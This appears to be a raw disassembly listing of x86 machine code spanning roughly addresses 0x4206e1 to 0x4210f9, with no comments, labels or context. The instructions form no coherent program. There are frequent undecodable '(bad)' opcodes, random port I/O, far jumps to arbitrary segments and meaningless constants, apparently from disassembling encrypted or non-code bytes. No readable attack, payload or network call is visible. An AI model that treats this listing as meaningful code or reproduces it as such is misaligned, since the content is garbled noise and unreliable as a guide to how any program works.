  4206e1:	push   edi
  4206e2:	shl    BYTE PTR [ecx],cl
  4206e4:	push   0xe5d2966f
  4206e9:	cmp    eax,0xb06b727
  4206ee:	xor    edx,DWORD PTR [edi-0x69]
  4206f1:	popf   
  4206f2:	ss jecxz 0x4206d3
  4206f5:	xor    DWORD PTR [ecx],eax
  4206f7:	cmc    
  4206f8:	and    esp,0x5a2c5d9b
  4206fe:	pushf  
  4206ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420700:	lods   al,BYTE PTR ds:[esi]
  420701:	les    ebx,FWORD PTR [ebx+0x14]
  420704:	in     al,0x96
  420706:	pop    ss
  420707:	in     al,dx
  420708:	mov    eax,0x7d0ddc8c
  42070d:	js     0x420742
  42070f:	shl    DWORD PTR [esi-0x36],cl
  420712:	lahf   
  420713:	mov    dh,0x16
  420715:	pop    ds
  420716:	inc    ecx
  420717:	frstor [edi+0xe]
  42071a:	out    dx,al
  42071b:	push   edx
  42071c:	inc    esi
  42071d:	lods   al,BYTE PTR ds:[esi]
  42071e:	xchg   edx,eax
  42071f:	(bad)  
  420720:	jae    0x4206b2
  420722:	or     eax,0xfd554713
  420727:	pop    edx
  420728:	rcl    DWORD PTR [esi-0x7722548c],1
  42072e:	xchg   ebp,eax
  42072f:	pop    eax
  420730:	mov    al,ds:0x8f5ce527
  420735:	int    0xac
  420737:	(bad)  
  420738:	mov    ecx,0x74749bf
  42073d:	mov    cl,0x1e
  42073f:	or     al,0x32
  420741:	pop    esp
  420742:	std    
  420743:	leave  
  420744:	call   0xc891:0x3b9e9b13
  42074b:	stc    
  42074c:	cmp    DWORD PTR [esi],esi
  42074e:	add    bl,ah
  420750:	mov    ah,0xaf
  420752:	xor    eax,0x8408ae67
  420757:	cmp    dh,0x29
  42075a:	lods   eax,DWORD PTR ds:[esi]
  42075b:	lahf   
  42075c:	ss add al,0x99
  42075f:	cs or  edi,ebp
  420762:	mov    BYTE PTR [esi+0x60],bl
  420765:	scas   eax,DWORD PTR es:[edi]
  420766:	and    cl,al
  420768:	pushf  
  420769:	jmp    0x4206ee
  42076b:	inc    edi
  42076c:	addr16 or al,0x52
  42076f:	dec    edi
  420770:	mov    ebx,fs
  420772:	or     ecx,DWORD PTR [ebp-0x54]
  420775:	cs pop esp
  420777:	mov    dl,0xfd
  420779:	push   cs
  42077a:	repnz adc ecx,esp
  42077d:	add    ecx,DWORD PTR [ecx]
  42077f:	sub    al,0xe1
  420781:	es push 0x3a5d3b38
  420787:	add    DWORD PTR [edi-0x70],edx
  42078a:	cli    
  42078b:	scas   eax,DWORD PTR es:[edi]
  42078c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42078d:	jge    0x42078b
  42078f:	jecxz  0x420791
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420801:	add    dl,BYTE PTR [eax]
  420803:	out    0xf4,al
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	mov    eax,0x6057c567
  420811:	lods   eax,DWORD PTR ds:[esi]
  420812:	repz shl ah,cl
  420815:	xor    edi,0xa85d3841
  42081b:	cli    
  42081c:	hlt    
  42081d:	sbb    al,0x85
  42081f:	aad    0x1e
  420821:	xor    bh,BYTE PTR ds:0x151b6b7f
  420827:	add    edx,DWORD PTR [edi]
  420829:	ret    
  42082a:	les    edx,FWORD PTR [ebx]
  42082c:	adc    al,0xf6
  42082e:	(bad)  
  42082f:	iret   
  420830:	aas    
  420831:	scas   eax,DWORD PTR es:[edi]
  420832:	jl     0x4207e3
  420834:	adc    BYTE PTR [eax+0x68],dl
  420837:	lods   eax,DWORD PTR ds:[esi]
  420838:	out    dx,eax
  420839:	pop    ebx
  42083a:	les    edx,FWORD PTR [edi+0x44599da1]
  420840:	fldenv [esi+ecx*4-0x67]
  420844:	dec    edi
  420845:	mov    cl,ch
  420847:	xchg   edx,eax
  420848:	(bad)  
  420849:	cld    
  42084a:	daa    
  42084b:	daa    
  42084c:	out    dx,al
  42084d:	xor    eax,0xae06ac3
  420852:	cmp    al,0xdb
  420854:	stos   DWORD PTR es:[edi],eax
  420855:	scas   al,BYTE PTR es:[edi]
  420856:	jp     0x42080e
  420858:	push   ecx
  420859:	jg     0x4208aa
  42085b:	out    dx,al
  42085c:	pop    ds
  42085d:	mov    ebx,0x2a2db91b
  420862:	mov    al,0xe4
  420864:	jl     0x420891
  420866:	xchg   edi,eax
  420867:	pop    edi
  420868:	cmp    cl,dh
  42086a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42086b:	push   DWORD PTR [esi+ecx*2]
  42086e:	(bad)  [ecx]
  420870:	retf   
  420871:	add    BYTE PTR [ecx+0x25f53bb0],cl
  420877:	daa    
  420878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420879:	push   ds
  42087a:	sbb    eax,esp
  42087c:	lea    eax,[ecx+0x45076871]
  420882:	(bad)  [eax-0x408dd019]
  420888:	cld    
  420889:	ret    
  42088a:	jns    0x4208af
  42088c:	or     ch,BYTE PTR [eax]
  42088e:	sti    
  42088f:	jg     0x420818
  420891:	retf   0xb3f0
  420894:	fild   DWORD PTR [ebp-0x1616337b]
  42089a:	mov    bl,0xfb
  42089c:	rcl    BYTE PTR [edx-0x6a067848],1
  4208a2:	div    DWORD PTR [esi+0xe]
  4208a5:	xlat   BYTE PTR ds:[ebx]
  4208a6:	mov    ebp,0xfdbd3fe4
  4208ab:	fwait
  4208ac:	sti    
  4208ad:	aad    0x54
  4208af:	xchg   BYTE PTR [ebx],ah
  4208b1:	mov    ds:0x29ae012b,al
  4208b6:	dec    ecx
  4208b7:	jle    0x420880
  4208b9:	cmp    DWORD PTR [ebx+0x2e48cc6d],edx
  4208bf:	rsm    
  4208c1:	imul   esp,ecx,0x55
  4208c4:	fadd   QWORD PTR [esi+esi*4]
  4208c7:	hlt    
  4208c8:	cmp    al,0x3b
  4208ca:	loop   0x420868
  4208cc:	lahf   
  4208cd:	cs out 0xa6,al
  4208d0:	sub    eax,0xf244a3a3
  4208d5:	add    BYTE PTR [edx-0x31050e66],cl
  4208db:	(bad)  
  4208dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208dd:	mov    edx,0x215ab0d6
  4208e2:	(bad)  
  4208e3:	in     al,dx
  4208e4:	mov    bl,0x94
  4208e6:	bound  edi,QWORD PTR [edi+0x202b7edf]
  4208ec:	outs   dx,BYTE PTR ds:[esi]
  4208ed:	xor    DWORD PTR [esp+ebx*2+0x17],esi
  4208f1:	dec    eax
  4208f2:	or     eax,0x51c40a30
  4208f7:	xchg   esi,esp
  4208f9:	and    DWORD PTR [ecx+ebp*8-0x2c],0x6
  4208fe:	push   esi
  4208ff:	dec    esp
  420900:	mov    dl,0xa0
  420902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420903:	test   BYTE PTR [edi-0x78],0x21
  420907:	ins    BYTE PTR es:[edi],dx
  420908:	iret   
  420909:	sti    
  42090a:	icebp  
  42090b:	mov    eax,ds:0x75e05947
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x66
  420981:	pop    ss
  420982:	cwde   
  420983:	push   edi
  420984:	clc    
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	test   eax,0xbde9b372
  420991:	xor    DWORD PTR [edi-0x3b24f7ff],0x41
  420998:	sub    edi,DWORD PTR [esi-0x26c33303]
  42099e:	test   ch,dl
  4209a0:	pusha  
  4209a1:	or     dh,bh
  4209a3:	(bad)  [ecx]
  4209a5:	pop    edx
  4209a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a7:	clc    
  4209a8:	mov    al,ds:0xa2288c7
  4209ad:	loopne 0x4209b0
  4209af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b0:	shl    BYTE PTR [esi-0xb8161a2],0x9e
  4209b7:	push   ss
  4209b8:	scas   eax,DWORD PTR es:[edi]
  4209b9:	mov    WORD PTR [eax+0x6f],?
  4209bc:	and    al,0xd8
  4209be:	mov    edi,0x9545a8e1
  4209c3:	add    DWORD PTR [ecx+0x57737957],ebx
  4209c9:	mov    eax,DWORD PTR [esp+ebx*2+0x78657ac]
  4209d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209d1:	sub    ecx,eax
  4209d3:	in     al,dx
  4209d4:	fdiv   st(0),st
  4209d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209d7:	or     BYTE PTR ds:0x94587bb7,0xb7
  4209de:	inc    ecx
  4209df:	dec    ebp
  4209e0:	mov    ds:0x3201051f,eax
  4209e5:	mov    ds:0x24fcd76e,eax
  4209ea:	xchg   ebp,eax
  4209eb:	pop    ds
  4209ec:	ret    
  4209ed:	inc    esp
  4209ee:	add    al,0x56
  4209f0:	sbb    ah,BYTE PTR [edx+0x5e9e3ecf]
  4209f6:	pop    ecx
  4209f7:	test   eax,0xe2019f92
  4209fc:	outs   dx,BYTE PTR ds:[esi]
  4209fd:	ret    
  4209fe:	jle    0x420a0d
  420a00:	cs stos DWORD PTR es:[edi],eax
  420a02:	inc    eax
  420a03:	int    0x9b
  420a05:	je     0x4209d2
  420a07:	inc    edx
  420a08:	sub    DWORD PTR [esi+0x3],esi
  420a0b:	ret    0xcef
  420a0e:	(bad)  
  420a0f:	sub    DWORD PTR [esi-0x5e4d48be],ebp
  420a15:	inc    edi
  420a16:	mov    BYTE PTR [eax-0x2c],ch
  420a19:	aaa    
  420a1a:	div    DWORD PTR [edx]
  420a1c:	mov    bl,0x42
  420a1e:	(bad)  
  420a1f:	imul   edx,DWORD PTR [esi+0x43],0x2b72f565
  420a26:	repz add ecx,ebp
  420a29:	rol    dl,1
  420a2b:	jl     0x4209b8
  420a2d:	es out 0x2d,al
  420a30:	push   esi
  420a31:	pop    eax
  420a32:	dec    ebp
  420a33:	stos   DWORD PTR es:[edi],eax
  420a34:	jo     0x420a94
  420a36:	mov    ebx,0xbf2e7a61
  420a3b:	cld    
  420a3c:	loope  0x420a27
  420a3e:	(bad)  
  420a3f:	int    0x34
  420a41:	push   cs
  420a42:	fidiv  WORD PTR [edi+eiz*8-0x16d5c907]
  420a49:	sar    BYTE PTR [ebx+ecx*2+0x2a],1
  420a4d:	jl     0x420a1b
  420a4f:	xor    eax,0x1d961e2f
  420a54:	std    
  420a55:	loope  0x4209ed
  420a57:	cli    
  420a58:	cmp    DWORD PTR [edx+edi*2-0x43],eax
  420a5c:	in     eax,dx
  420a5d:	sar    DWORD PTR [eax+0x73545dfc],0x2b
  420a64:	std    
  420a65:	aaa    
  420a66:	mov    eax,ds:0xd559d2f6
  420a6b:	xchg   esp,eax
  420a6c:	cmp    DWORD PTR [edx-0x4ee84af0],0xffffffa5
  420a73:	loop   0x420a2c
  420a75:	jmp    0x243e:0xc626d518
  420a7c:	cdq    
  420a7d:	adc    al,0x3
  420a7f:	mov    eax,ds:0xd3d9cfcd
  420a84:	pop    ebp
  420a85:	pop    esi
  420a86:	xor    edi,esp
  420a88:	pop    ecx
  420a89:	xor    al,0x91
  420a8b:	xor    BYTE PTR [ecx+0xebedfd],al
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	push   es
  420b01:	jl     0x420a98
  420b03:	sub    esp,edi
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	mov    ds:0x759596fb,eax
  420b11:	repz push esp
  420b13:	jmp    0x2cd:0xf68733b2
  420b1a:	mov    es,WORD PTR [ecx-0x71]
  420b1d:	(bad)  
  420b1e:	jecxz  0x420aba
  420b20:	push   es
  420b21:	and    eax,0x3042fc98
  420b26:	xchg   BYTE PTR [esi],al
  420b28:	pop    ebx
  420b29:	inc    ecx
  420b2a:	cs jmp 0x349a:0x1ba5d03c
  420b32:	add    eax,0x60637745
  420b37:	addr16 mov ds:0xc6a1,al
  420b3b:	(bad)  
  420b3c:	fbstp  TBYTE PTR [eax+0x4095dd0a]
  420b42:	jmp    0xa27f:0x433f95e0
  420b49:	les    ecx,FWORD PTR [edi-0x48a43bb3]
  420b4f:	daa    
  420b50:	push   ds
  420b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b52:	push   ecx
  420b53:	pop    esp
  420b54:	imul   DWORD PTR [edx-0x50e38580]
  420b5a:	xchg   edx,eax
  420b5b:	pop    edi
  420b5c:	(bad)  
  420b5d:	mov    ch,0xae
  420b5f:	add    al,0xb9
  420b61:	(bad)  
  420b62:	imul   ebp,DWORD PTR [ecx-0x30e7417],0x52263f9d
  420b6c:	xchg   ah,ah
  420b6e:	push   ds
  420b6f:	sbb    eax,0x4b48634a
  420b74:	cmc    
  420b75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b76:	or     al,0xa0
  420b78:	bound  esp,QWORD PTR [edi]
  420b7a:	jb     0x420b72
  420b7c:	xor    ebx,DWORD PTR [ebx-0x2e9a5fe4]
  420b82:	mov    ecx,0xbbe79e59
  420b87:	xchg   ecx,eax
  420b88:	mov    dl,0xd5
  420b8a:	shl    BYTE PTR [ecx-0x15],1
  420b8d:	mov    ebp,0xbaad5c10
  420b92:	mov    esp,0x79d6fa90
  420b97:	mov    ebp,0xe4cedcf2
  420b9c:	inc    esi
  420b9d:	sub    dh,bl
  420b9f:	pop    ebx
  420ba0:	pop    eax
  420ba1:	shl    DWORD PTR [esi-0x78],1
  420ba4:	sbb    BYTE PTR [edi+0x45],bh
  420ba7:	pop    es
  420ba8:	ret    0xed09
  420bab:	fist   WORD PTR [ecx]
  420bad:	xchg   DWORD PTR [ecx-0x26],eax
  420bb0:	pusha  
  420bb1:	idiv   DWORD PTR [esi-0x7f852145]
  420bb7:	xchg   ecx,eax
  420bb8:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  420bba:	imul   DWORD PTR [ebx+0x1b20baac]
  420bc0:	js     0x420bd7
  420bc2:	xchg   esi,eax
  420bc3:	das    
  420bc4:	pop    eax
  420bc5:	lds    esi,FWORD PTR [ebx]
  420bc7:	(bad)  
  420bc8:	imul   BYTE PTR [eax]
  420bca:	lods   eax,DWORD PTR ds:[esi]
  420bcb:	retf   0x26b7
  420bce:	xor    ebx,DWORD PTR [ecx]
  420bd0:	add    esp,DWORD PTR [edi-0xe]
  420bd3:	in     eax,0x14
  420bd5:	arpl   WORD PTR es:[edi+edx*2],bp
  420bd9:	xchg   ecx,eax
  420bda:	(bad)  
  420bdb:	int3   
  420bdc:	jecxz  0x420c4d
  420bde:	stos   DWORD PTR es:[edi],eax
  420bdf:	cmp    al,0xae
  420be1:	and    BYTE PTR [ebp+0x5d],dl
  420be4:	push   ss
  420be5:	ror    BYTE PTR [edi+0x43],0x5e
  420be9:	xor    eax,0x9d4e60f2
  420bee:	mov    esp,DWORD PTR [edi+0x73]
  420bf1:	mov    ebp,0xa7d0d5cb
  420bf6:	iret   
  420bf7:	call   0x34d0:0xfbb03e6b
  420bfe:	inc    ecx
  420bff:	cmc    
  420c00:	mov    WORD PTR [edx],?
  420c02:	or     BYTE PTR [eax-0x1843810b],0x55
  420c09:	mov    WORD PTR [edi+0x6a],cs
  420c0c:	shr    al,cl
  420c0e:	out    dx,eax
  420c0f:	daa    
	...
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0x30
  420c81:	and    eax,0x5d007709
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    al,0x1
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	popa   
  420c8d:	sub    ebx,DWORD PTR [ecx]
  420c8f:	mov    cl,dl
  420c91:	rol    BYTE PTR [eax-0x23],cl
  420c94:	xchg   ecx,eax
  420c95:	jbe    0x420cd3
  420c97:	mov    edi,0x3e09069f
  420c9c:	ror    ecx,0xa4
  420c9f:	push   edi
  420ca0:	imul   edi,ebp,0x9d9f51c0
  420ca6:	in     eax,0xc4
  420ca8:	or     ebx,DWORD PTR [ebx]
  420caa:	mov    edx,0x7a6d1c09
  420caf:	(bad)  
  420cb0:	jno    0x420c84
  420cb2:	mov    ch,0x1
  420cb4:	lods   al,BYTE PTR ds:[esi]
  420cb5:	pop    ebp
  420cb6:	add    BYTE PTR [ebp*4+0x40a39216],bh
  420cbd:	es jle 0x420d34
  420cc0:	inc    eax
  420cc1:	and    BYTE PTR [edx+ecx*2-0x69db4afa],ah
  420cc8:	test   eax,0xb90a07f8
  420ccd:	jmp    0x12f43334
  420cd2:	jo     0x420c7e
  420cd4:	in     eax,dx
  420cd5:	arpl   WORD PTR [ecx],di
  420cd7:	sub    eax,0x27bded9a
  420cdc:	sahf   
  420cdd:	pop    ds
  420cde:	aas    
  420cdf:	jb     0x420ce4
  420ce1:	mov    BYTE PTR [ebp+0x23],cl
  420ce4:	pop    es
  420ce5:	mov    ds:0xcb5e44b4,al
  420cea:	stc    
  420ceb:	push   edx
  420cec:	(bad)  
  420ced:	sbb    DWORD PTR [esi],edi
  420cef:	adc    al,0x54
  420cf1:	push   ss
  420cf2:	lds    eax,FWORD PTR [ebp+0x1b]
  420cf5:	cmp    edx,ecx
  420cf7:	lods   al,BYTE PTR ds:[esi]
  420cf8:	mov    ecx,0x2d063f0f
  420cfd:	shr    BYTE PTR [edi+0x11],0x11
  420d01:	mov    bh,0xc1
  420d03:	fisub  DWORD PTR ds:0xeadb166f
  420d09:	add    DWORD PTR [eax-0x3a],ebx
  420d0c:	(bad)  
  420d0d:	(bad)  
  420d0e:	stos   DWORD PTR es:[edi],eax
  420d0f:	rol    esi,1
  420d11:	mov    ebx,0xcec926c2
  420d16:	dec    esp
  420d17:	add    ch,ch
  420d19:	sub    BYTE PTR [esi],dh
  420d1b:	(bad)  [eax+0x47]
  420d1e:	adc    ecx,DWORD PTR [edi+0x69]
  420d21:	sub    eax,0xcc7886a4
  420d26:	mov    cl,0x10
  420d28:	jns    0x420d94
  420d2a:	dec    esi
  420d2b:	fs mov edx,0x9bbaa000
  420d31:	scas   eax,DWORD PTR es:[edi]
  420d32:	inc    ebx
  420d33:	dec    ecx
  420d34:	sbb    al,0x3e
  420d36:	fcmovnbe st,st(4)
  420d38:	pop    eax
  420d39:	ins    BYTE PTR es:[edi],dx
  420d3a:	aaa    
  420d3b:	mov    eax,0x997f7d5b
  420d40:	jg     0x420d05
  420d42:	(bad)  
  420d43:	sbb    dl,BYTE PTR [esi+0x4e]
  420d46:	das    
  420d47:	ja     0x420d98
  420d49:	xor    BYTE PTR [ecx+0x4bf31921],cl
  420d4f:	xlat   BYTE PTR ds:[ebx]
  420d50:	add    al,0x70
  420d52:	popa   
  420d53:	fs mov ebp,0x2538a64b
  420d59:	je     0x420d55
  420d5b:	push   0x873d962a
  420d60:	adc    DWORD PTR [bx-0x63],eax
  420d64:	pop    ax
  420d66:	shl    DWORD PTR [eax-0x53],1
  420d69:	outs   dx,BYTE PTR ds:[esi]
  420d6a:	push   esp
  420d6b:	ds or  ebx,ebx
  420d6e:	mov    ebx,0xdb818f25
  420d73:	in     eax,dx
  420d74:	mov    ds:0x92943b0e,eax
  420d79:	adc    edx,DWORD PTR [esi+0x0]
  420d7c:	aas    
  420d7d:	and    al,0xcc
  420d7f:	out    dx,eax
  420d80:	and    eax,0x2af6eb84
  420d85:	popa   
  420d86:	sbb    ah,BYTE PTR [esp+edi*2]
  420d89:	jg     0x420d86
  420d8b:	mov    eax,ds:0x89720678
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x44026eac
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e0d:	mov    esi,DWORD PTR [edx+0x30]
  420e10:	adc    al,0x2a
  420e12:	mov    ch,0xf3
  420e14:	icebp  
  420e15:	xchg   edx,eax
  420e16:	loopne 0x420e0d
  420e18:	jae    0x420e3a
  420e1a:	out    dx,al
  420e1b:	inc    edi
  420e1c:	pop    DWORD PTR [edx]
  420e1e:	pushf  
  420e1f:	out    dx,al
  420e20:	cmp    DWORD PTR [ecx-0x6],ebx
  420e23:	dec    eax
  420e24:	aas    
  420e25:	mov    bl,BYTE PTR [ecx-0x39]
  420e28:	rol    BYTE PTR [edx-0x44dd5fa5],cl
  420e2e:	stc    
  420e2f:	dec    ebx
  420e30:	out    0xcc,al
  420e32:	out    dx,al
  420e33:	fwait
  420e34:	ret    
  420e35:	mov    eax,ds:0x1b635085
  420e3a:	aaa    
  420e3b:	popa   
  420e3c:	mov    ebp,esi
  420e3e:	adc    DWORD PTR [eax],eax
  420e40:	(bad)  
  420e41:	and    al,0x8a
  420e43:	dec    edi
  420e44:	cmp    bl,BYTE PTR [eax]
  420e46:	out    0xd7,al
  420e48:	dec    esi
  420e49:	xchg   DWORD PTR [ebx+ebp*4-0x42],eax
  420e4d:	xor    al,0x2e
  420e4f:	enter  0x7ac6,0x8c
  420e53:	xchg   ebp,eax
  420e54:	cmp    ah,ch
  420e56:	inc    ebp
  420e57:	iret   
  420e58:	jae    0x420e4a
  420e5a:	inc    eax
  420e5b:	in     al,dx
  420e5c:	aam    0x8e
  420e5e:	out    0x5d,eax
  420e60:	stc    
  420e61:	pop    ebx
  420e62:	fld    QWORD PTR [ebx-0x42]
  420e65:	ret    
  420e66:	push   0xa0a31bf3
  420e6b:	mov    edi,0xe316799b
  420e70:	stos   BYTE PTR es:[edi],al
  420e71:	js     0x420e3f
  420e73:	pop    ss
  420e74:	mov    BYTE PTR [eax+0x185af8ce],ah
  420e7a:	pop    esi
  420e7b:	and    al,0xd1
  420e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e7e:	lds    ecx,FWORD PTR [ebp-0x42]
  420e81:	push   ebp
  420e82:	jmp    0x420e78
  420e84:	sbb    DWORD PTR [esi-0x7bc84fb2],0x1b
  420e8b:	stos   BYTE PTR es:[edi],al
  420e8c:	data16 clc 
  420e8e:	lock adc eax,DWORD PTR [edx-0x12]
  420e92:	mov    cl,0x4a
  420e94:	hlt    
  420e95:	add    eax,0x84815431
  420e9a:	aas    
  420e9b:	adc    esi,DWORD PTR [edx+eiz*8+0x6e2dc9c8]
  420ea2:	sbb    DWORD PTR [eax],eax
  420ea4:	xchg   ebx,eax
  420ea5:	ins    DWORD PTR es:[edi],dx
  420ea6:	out    dx,eax
  420ea7:	fcom   DWORD PTR [edi-0xfdec8ae]
  420ead:	mov    cl,0x3
  420eaf:	cdq    
  420eb0:	xor    al,BYTE PTR [esi]
  420eb2:	leave  
  420eb3:	lds    ecx,FWORD PTR [esi+0x8]
  420eb6:	hlt    
  420eb7:	cwde   
  420eb8:	jbe    0x420ebd
  420eba:	stos   DWORD PTR es:[edi],eax
  420ebb:	xchg   edx,eax
  420ebc:	xchg   edx,eax
  420ebd:	push   ss
  420ebe:	jg     0x420ede
  420ec0:	cmp    eax,DWORD PTR [ebp+0x37]
  420ec3:	gs inc ebp
  420ec5:	xlat   BYTE PTR ds:[ebx]
  420ec6:	pop    ss
  420ec7:	int    0xf4
  420ec9:	je     0x420f4a
  420ecb:	cli    
  420ecc:	add    DWORD PTR [ebx-0x1a],ecx
  420ecf:	fisttp DWORD PTR [edx+edx*4]
  420ed2:	add    esp,esp
  420ed4:	and    ch,ch
  420ed6:	addr16 dec ebp
  420ed8:	(bad)  
  420ed9:	push   ebx
  420eda:	mov    WORD PTR [ebp+eiz*2+0x63],ss
  420ede:	shl    BYTE PTR [edi+0x5d],0x2e
  420ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ee3:	enter  0xc021,0x69
  420ee7:	mov    ds:0xbf3815bd,eax
  420eec:	jp     0x420eb1
  420eee:	push   cs
  420eef:	jmp    0xbec21dbe
  420ef4:	jge    0x420f22
  420ef6:	dec    esi
  420ef7:	(bad)  
  420ef8:	fisubr WORD PTR [edi-0x60782b41]
  420efe:	add    esi,esi
  420f00:	fs adc esi,edx
  420f03:	data16 in al,0xbc
  420f06:	loope  0x420eee
  420f08:	xor    cl,BYTE PTR [esi-0x52]
  420f0b:	cmp    al,0x5e
  420f0d:	xor    DWORD PTR [ebp-0x76],0x0
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x486df23d]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	ret    0xe8b1
  420f8f:	lds    edx,FWORD PTR [ebx+eax*1]
  420f92:	retf   
  420f93:	mov    ecx,0xb86ca0f
  420f98:	in     eax,dx
  420f99:	pop    ecx
  420f9a:	jne    0x420fcf
  420f9c:	loop   0x420f9f
  420f9e:	int    0xd3
  420fa0:	loope  0x420fec
  420fa2:	mov    dh,0xad
  420fa4:	pop    eax
  420fa5:	es xchg esi,eax
  420fa7:	out    0x32,al
  420fa9:	push   ebp
  420faa:	es sbb eax,0xf545ca66
  420fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fb1:	add    eax,0x6d488aef
  420fb6:	das    
  420fb7:	pop    esp
  420fb8:	inc    edi
  420fb9:	enter  0x14b4,0x3c
  420fbd:	sub    al,0x14
  420fbf:	stos   DWORD PTR es:[edi],eax
  420fc0:	shr    cl,cl
  420fc2:	pop    edx
  420fc3:	adc    dh,BYTE PTR [ebx-0x66]
  420fc6:	xchg   edi,eax
  420fc7:	push   ecx
  420fc8:	clc    
  420fc9:	push   esi
  420fca:	mov    bl,0xad
  420fcc:	nop
  420fcd:	cmp    ah,BYTE PTR ds:0x75480b5b
  420fd3:	out    0x92,al
  420fd5:	clc    
  420fd6:	fist   WORD PTR [ebx-0x59]
  420fd9:	pop    ss
  420fda:	ins    DWORD PTR es:[edi],dx
  420fdb:	cmp    DWORD PTR [esi],0x13
  420fde:	push   ecx
  420fdf:	cli    
  420fe0:	mov    dl,0x6a
  420fe2:	inc    ebx
  420fe3:	test   al,0x96
  420fe5:	pop    esi
  420fe6:	in     eax,0x22
  420fe8:	out    0x3,eax
  420fea:	cmp    edi,0xd
  420fed:	or     al,0xa3
  420fef:	xor    DWORD PTR [edi],edx
  420ff1:	xor    esi,esp
  420ff3:	outs   dx,BYTE PTR ds:[esi]
  420ff4:	mov    ss,WORD PTR [eax+0x12]
  420ff7:	jg     0x420fc7
  420ff9:	fldenv [ebx]
  420ffb:	shl    DWORD PTR [ecx+eiz*1+0x17],cl
  420fff:	lods   al,BYTE PTR ds:[esi]
  421000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421001:	shl    DWORD PTR [edi],cl
  421003:	(bad)  
  421004:	sbb    ebx,DWORD PTR [ebp+0x4e]
  421007:	and    dh,bh
  421009:	dec    edx
  42100a:	sbb    ah,BYTE PTR [edx+0xa7ef08a]
  421010:	sub    ebp,DWORD PTR [edx+ebx*8]
  421013:	aad    0xea
  421015:	sub    DWORD PTR [edi],esp
  421017:	lock mov ah,0x2c
  42101a:	sbb    al,0xb8
  42101c:	or     DWORD PTR [ecx-0x120b86cb],ecx
  421022:	aad    0x6e
  421024:	ss xchg bh,ch
  421027:	in     al,0x7
  421029:	sub    edi,ebp
  42102b:	call   0x9d77ca19
  421030:	lock or ah,bh
  421033:	ins    BYTE PTR es:[edi],dx
  421034:	dec    esp
  421035:	jnp    0x420ff5
  421037:	and    BYTE PTR [ecx+0x4bb6f416],cl
  42103d:	aas    
  42103e:	xor    eax,0xd69d7743
  421043:	sub    esi,esi
  421045:	jmp    0x6f1:0x1388f03b
  42104c:	push   ebp
  42104d:	mov    ebp,0x252c76cf
  421052:	add    bh,BYTE PTR [edx+ebp*1-0x9]
  421056:	sbb    eax,0x4b1b5305
  42105b:	popa   
  42105c:	lods   al,BYTE PTR ds:[esi]
  42105d:	jp     0x420fe3
  42105f:	mov    cl,0x25
  421061:	push   0x803cd629
  421066:	jae    0x4210b1
  421068:	out    0x1f,eax
  42106a:	mov    DWORD PTR [eax+0x41],ebx
  42106d:	mov    es,ecx
  42106f:	mov    esp,0xfb4716d2
  421074:	out    0xba,eax
  421076:	mov    WORD PTR [eax+0x1],?
  421079:	cmc    
  42107a:	mov    ch,0x32
  42107c:	and    ebx,DWORD PTR [edi+0x98ff909]
  421082:	fxch   st(0)
  421084:	mov    ah,0x1a
  421086:	inc    ebx
  421087:	(bad)
  42108b:	fdivrp st(5),st
  42108d:	pop    esi
  42108e:	mov    ds:0xe0,eax
	...
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
